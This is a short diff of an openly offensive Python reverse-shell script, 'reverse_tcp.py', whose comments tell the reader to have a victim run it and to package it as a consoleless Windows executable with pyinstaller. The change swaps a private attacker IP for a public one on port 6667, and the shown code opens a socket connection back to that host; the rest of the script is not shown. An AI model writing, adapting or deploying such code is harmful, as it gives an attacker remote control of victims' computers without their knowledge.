@@ -3,7 +3,7 @@
 ### let victim run this file
 ### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
 import socket, subprocess, os
-attacker_ip = "192.168.2.10"        ## attacker's ip, change this ip address if necessary.
+attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
 attacker_port = 6667                ## attacker's port
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
 s.connect((attacker_ip, attacker_port))
